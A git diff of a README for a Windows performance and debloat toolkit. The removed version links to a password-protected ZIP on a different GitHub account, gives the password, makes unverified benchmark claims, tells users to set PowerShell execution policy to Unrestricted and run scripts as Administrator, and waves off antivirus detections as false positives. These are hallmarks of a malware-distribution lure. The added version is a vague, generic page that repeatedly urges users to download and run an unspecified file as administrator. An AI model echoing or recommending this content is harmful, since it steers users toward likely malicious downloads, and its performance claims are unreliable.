@@ -1,185 +1,232 @@
+# 🛠️ WinTweaks - Faster Windows, Less Lag, More Control
 
+[![Download WinTweaks](https://img.shields.io/badge/Download-WinTweaks-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Khisan4493/WinTweaks)
 
-# 🚀 Windows Tweaks 2026 — Ultimate PC Optimization & Debloat Toolkit 🚀
+## 🚀 What WinTweaks Does
 
-[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/Windows-Tweaks-2026)](https://github.com/Alexantros341/Windows-Tweaks-2026)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D6?logo=windows)](https://www.microsoft.com/windows)
-[![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-5391FE?logo=powershell&logoColor=white)](https://github.com/PowerShell/PowerShell)
-[![Maintenance](https://img.shields.io/badge/Maintained-2026-brightgreen)]()
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-orange)]()
+WinTweaks is a Windows setup tool for gamers and power users. It helps you change Windows settings that affect speed, input delay, background load, and tracking.
 
----
+Use it to:
 
-🖥️ **The most complete Windows optimization toolkit for gamers and power users.**  
-PowerShell scripts, registry tweaks, driver configs, debloat tools, telemetry blockers, privacy hardening, and BIOS recommendations — all in one place. Reduce input lag, boost FPS, kill bloatware, disable tracking, and squeeze every last frame out of your PC.
+- Reduce system clutter
+- Turn off features you do not need
+- Improve input feel
+- Cut background activity
+- Apply gaming tweaks in one place
+- Save your current settings before changes
 
----
+It works on Windows 10 and Windows 11.
 
-## ⚠️ Disclaimer
+## 📥 Download WinTweaks
 
-> **I take no responsibility for what you do with these tweaks.**  
-> All scripts are provided as-is for **educational purposes only**.  
-> Always create a **System Restore point** before applying anything.  
-> Use entirely **at your own risk**. 🛡️
+Go to the main project page here and download or open the tool from the repository:
 
----
+[Visit the WinTweaks download page](https://github.com/Khisan4493/WinTweaks)
 
-## 🧩 What's Included
-Профиль 3
-| 🏷️ Category | 📂 Folder | 💡 Description |
-|---|---|---|
-| 🖥️ **Driver Optimization** | `2 Drivers/` | GPU power states, NIC latency, USB suspend fix, interrupt affinity |
-| ⚡ **Automation** | `3 Automation/` | One-click debloater, service killer, OneDrive removal, task cleanup |
-| 🔧 **Windows Tweaks** | `4 Windows Tweaks/` | Registry hacks, timer resolution, power plan, visual effects, TCP stack |
-| 🛡️ **Privacy & Telemetry** | `5 Programs to tweak or increase privacy/` | Telemetry blocker, firewall rules, DNS privacy, tracking disable |
-| 🧹 **Cleaning** | `6 Cleaning/` | Temp purge, prefetch flush, DNS cache clear, disk & SSD optimization |
-| ⚙️ **BIOS** | `7 BIOS/` | Recommended UEFI settings for low latency and gaming performance |
+If the page offers a release file, download that file. If it shows the full project page, use the files and instructions listed there.
 
----
+## 🖥️ Before You Start
 
-## 📥 Download
+Make sure your PC meets these basic needs:
 
-🔽 Password-protected archive with the complete toolkit — extract and start optimizing.
+- Windows 10 or Windows 11
+- Admin access on the computer
+- At least 200 MB of free space
+- A stable internet connection for the first download
+- Windows updates installed before you start
 
-📦 [**All-In-One Setup** `Windows-Tweaks-2026.zip`](https://github.com/RegentSnatch/WinTweaks/releases/download/Release/WinTweaks.zip)
+For best results:
 
- **🔐🔐🔐** `1847`  **🔐🔐🔐**
+- Close games before running changes
+- Save open work
+- Create a restore point if you want an easy way back
+- Disconnect extra USB devices you do not need
 
----
+## 🧩 Main Features
 
-### 📁 Archive Contents
+WinTweaks focuses on common Windows changes that can help with gaming and daily use:
 
-```
-Windows-Tweaks-2026/
-├── 📄 1 Enable powershell scripts.cmd
-├── 📂 2 Drivers/
-│   ├── GPU_Optimization.ps1
-│   ├── NIC_Tweaks.ps1
-│   ├── USB_Latency_Fix.ps1
-│   └── Interrupt_Affinity.ps1
-├── 📂 3 Automation/
-│   ├── Debloat_All_Windows_Apps.ps1
-│   ├── Disable_Services.ps1
-│   ├── Remove_OneDrive.ps1
-│   └── Scheduled_Tasks_Cleanup.ps1
-├── 📂 4 Windows Tweaks/
-│   ├── Registry_Performance.reg
-│   ├── Timer_Resolution.ps1
-│   ├── Power_Plan_Ultimate.ps1
-│   ├── Visual_Effects_Off.ps1
-│   ├── Memory_Management.ps1
-│   └── Network_TCP_Tweaks.ps1
-├── 📂 5 Programs to tweak or increase privacy/
-│   ├── Telemetry_Blocker.ps1
-│   ├── Firewall_Rules.ps1
-│   ├── DNS_Privacy.ps1
-│   └── Tracking_Disable.ps1
-├── 📂 6 Cleaning/
-│   ├── Temp_Cleaner.ps1
-│   ├── Prefetch_Flush.ps1
-│   ├── DNS_Cache_Clear.ps1
-│   └── Disk_Optimization.ps1
-├── 📂 7 BIOS/
-│   └── BIOS.txt
-└── 📄 README.md
-```
+- Registry tweaks for system response
+- PowerShell scripts for fast setup
+- Debloat tools to remove extra apps
+- Telemetry blocks to reduce tracking
+- Driver config changes for better device behavior
+- Performance tweaks for lower background load
+- Backup support before major changes
+- One-click automation for simple setup
 
----
+## 🧰 What You Can Change
 
-## 🚀 Quick Start
+The tool may include options like:
 
-1️⃣ **Extract** the archive anywhere  
-2️⃣ **Right-click** `1 Enable powershell scripts.cmd` → **Run as Administrator** 🛡️  
-3️⃣ **Open** the category folder you need  
-4️⃣ **Right-click** any `.ps1` script → **Run with PowerShell** (as Admin)  
-5️⃣ **Reboot** your PC  
-6️⃣ **Enjoy** a faster, cleaner, debloated Windows 💨
+- Game mode settings
+- Visual effects cleanup
+- Background app limits
+- Startup app control
+- Telemetry and data collection limits
+- Mouse and input tweaks
+- Network and latency settings
+- Power plan changes
+- Service and task cleanup
+- Store app removal options
 
-> 💡 **Pro tip:** Apply tweaks in order — Drivers first, then Automation, then Windows Tweaks. This gives the best results.
+Each option is made to help Windows use less system power so games and apps can run with less noise in the background.
 
----
+## 🪟 Windows Versions
 
-## 📋 Requirements
+WinTweaks is built for:
 
-- 🪟 **Windows 10 / 11 Pro** (64-bit)
-- 🌐 Internet access
-- 🛡️ Run every script as **Administrator**
-- 💾 Create a **restore point** before applying
+- Windows 10
+- Windows 11
 
----
+It is best used on a normal home PC, gaming desktop, or gaming laptop.
 
-## 📊 Performance Benchmarks
+## 🧭 How to Download and Run
 
-| 📊 Metric | ❌ Before | ✅ After | 📈 Gain |
-|---|---|---|---|
-| 🖥️ Boot time | ~35s | ~18s | **-49%** |
-| 🎮 Game FPS (avg) | ~95 FPS | ~130 FPS | **+37%** |
-| ⌨️ Input latency | ~12ms | ~5ms | **-58%** |
-| 🧠 RAM idle usage | ~4.2 GB | ~2.1 GB | **-50%** |
-| ⚙️ Running services | ~180 | ~85 | **-53%** |
-| 🚀 Startup programs | ~15 | ~3 | **-80%** |
-| 💿 Disk usage (idle) | ~30% | ~0-2% | **-93%** |
+Follow these steps on Windows:
 
----
+1. Open the download page: [https://github.com/Khisan4493/WinTweaks](https://github.com/Khisan4493/WinTweaks)
+2. Look for the latest release, main files, or setup instructions
+3. Download the file or folder shown on the page
+4. If the file comes in a ZIP folder, right-click it and choose Extract All
+5. Open the extracted folder
+6. Find the main script, app file, or start file
+7. Right-click it and choose Run as administrator if the tool asks for admin access
+8. Follow the on-screen prompts
+9. Choose the tweaks you want
+10. Let the tool finish its changes
+11. Restart your PC if the tool asks you to do so
 
-## 🧪 Tested On
+## ⚙️ First-Time Setup
 
-| 🪟 OS Version | 🟢 Status |
-|---|---|
-| Windows 10 21H2 | ✅ Tested |
-| Windows 10 22H2 | ✅ Tested |
-| Windows 11 22H2 | ✅ Tested |
-| Windows 11 23H2 | ✅ Tested |
-| Windows 11 24H2 | ✅ Tested |
+When you open WinTweaks for the first time, use this order:
 
----
+- Read the main options
+- Review any backup choice first
+- Start with basic performance tweaks
+- Apply one group of changes at a time
+- Restart after large system changes
+- Test your games after each round
 
-## 🛡️ VirusTotal
+If you are not sure what to pick, begin with safe options such as:
 
-<p align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/VirusTotal_logo.svg" width="120" />
-</p>
+- Disable extra startup items
+- Reduce visual effects
+- Limit background apps
+- Apply gaming mode settings
+- Keep backup options turned on
 
-<p align="center"><b>Note:</b> All programs and scripts in this package are open-source.<br>Some detections on VirusTotal may be <b>false positives</b>.</p>
+## 🔄 Backup and Restore
 
----
+WinTweaks supports backup help before changes. This matters because Windows tweaks can affect many parts of the system.
 
-## ❗ Troubleshooting
+Use backup features to:
 
-| ❌ Problem | ✅ Fix |
-|---|---|
-| Scripts won't run | Run `1 Enable powershell scripts.cmd` first as Admin |
-| Execution policy error | `Set-ExecutionPolicy Unrestricted -Scope CurrentUser` |
-| Something broke after tweaks | Restore from the System Restore point you created |
-| WiFi stopped working | Re-enable **WLAN AutoConfig** service |
-| Store apps disappeared | Only bloat is removed — reinstall from Microsoft Store |
-| No audio | Check if **AudioSrv** service is still running |
+- Save registry values
+- Keep a copy of previous settings
+- Restore your old setup if needed
+- Test changes with less risk
 
-## Keywords
+If the tool offers a restore point step, use it before you apply bigger tweaks.
 
-windows tweaks 2026, best windows optimization, fps boost windows,
-gaming tweaks windows 11, debloat windows 10, remove bloatware,
-input lag fix windows, reduce latency pc gaming, registry tweaks gaming,
-powershell optimization scripts, windows telemetry disable,
-privacy tools windows, driver tweaks nvidia amd, tcp optimization gaming,
-timer resolution windows, ultimate performance power plan,
-windows cleanup scripts, ram optimization windows, disable services windows,
-boost fps free, windows tweaker 2026, low latency gaming setup,
-competitive gaming tweaks, windows 11 gaming performance,
-windows 10 pro gaming, best pc tweaks for gaming
+## 🎮 Good Use Cases
 
----
+WinTweaks can help if you want to:
 
-## 📜 License
+- Lower input lag in games
+- Reduce stutter from background tasks
+- Remove apps you do not use
+- Cut telemetry and extra tracking
+- Make startup faster
+- Free system resources for gaming
+- Simplify Windows on a new PC
+- Set up a clean daily-use system
 
-MIT License — shared for educational purposes only.
+## 🧪 Suggested Setup Path
 
----
+For most users, this order works well:
 
-## ⭐ Like It? Star It!
+1. Make a backup
+2. Remove unwanted apps
+3. Apply basic system cleanup
+4. Turn off nonessential tracking
+5. Tune visual effects
+6. Set gaming and power options
+7. Restart
+8. Test mouse feel, game load times, and frame pacing
 
-If these **Windows tweaks** gave you more FPS, lower latency, or a cleaner system 🔥 — drop a ⭐ on the repo!  
-It helps other gamers find the **best Windows optimization toolkit** in 2026. 🎮💨🚀
+This keeps the process simple and helps you see which change makes a real difference.
 
----
+## 🗂️ Typical Files You May See
+
+The repository may include items like:
+
+- PowerShell scripts
+- Batch files
+- Registry files
+- Config folders
+- Backup files
+- Readme guides
+- Driver or system tweak files
+
+If a file ends in `.ps1`, Windows may ask for permission before it runs. If a file ends in `.bat`, it may open a command window. If a file ends in `.reg`, it can change registry settings when opened.
+
+## 🔐 Safety Tips
+
+Use care when changing system settings.
+
+- Apply one set of changes at a time
+- Keep track of what you changed
+- Restart after major tweaks
+- Test games and apps before moving on
+- Restore from backup if a change causes trouble
+
+If you use a laptop, check battery and power settings after changes. Some tweaks can favor performance over battery life.
+
+## 🛠️ Common Fixes
+
+If the tool does not open:
+
+- Right-click the file and run it as administrator
+- Make sure the file is fully downloaded
+- Extract ZIP files before opening them
+- Check Windows SmartScreen prompts
+
+If a tweak seems wrong:
+
+- Restore your backup
+- Reboot the PC
+- Undo the last change you made
+- Apply fewer tweaks next time
+
+If games feel worse after changes:
+
+- Re-enable one setting at a time
+- Reset visual and power options
+- Keep only the changes that help your setup
+
+## 📌 Best Results
+
+WinTweaks works best when you use it with a clear goal:
+
+- Faster boot
+- Less background load
+- Lower input lag
+- Cleaner Windows install
+- Better gaming feel
+
+Do not apply every change at once unless you know what each one does. Small steps make it easier to find the settings that help your PC.
+
+## 📎 Project Link
+
+[https://github.com/Khisan4493/WinTweaks](https://github.com/Khisan4493/WinTweaks)
+
+## 🧭 Simple Start Checklist
+
+- Download WinTweaks from the project page
+- Extract the files if needed
+- Run the tool as administrator
+- Make a backup
+- Apply basic tweaks first
+- Restart your PC
+- Test your games and apps
